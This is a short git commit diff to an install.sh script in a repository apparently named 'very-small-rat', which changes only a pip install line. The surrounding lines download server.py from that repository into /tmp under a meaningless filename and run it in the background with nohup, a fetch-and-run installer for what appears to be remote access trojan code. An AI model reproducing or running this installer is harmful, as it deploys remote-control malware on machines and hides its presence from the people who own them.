b6e9255f27e0af6b024d11bb30306d91756a0399
griffn <37548204+killgriff22@users.noreply.github.com>
2022-04-01 11:33:33 -0400

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
-python3 -m pip install flask 
+python3 -m pip install flask requests
 cd /tmp
 curl "https://raw.githubusercontent.com/killgriff22/very-small-rat/main/server.py" -o AASFRGGETHGR
 nohup python3 AASFRGGETHGR
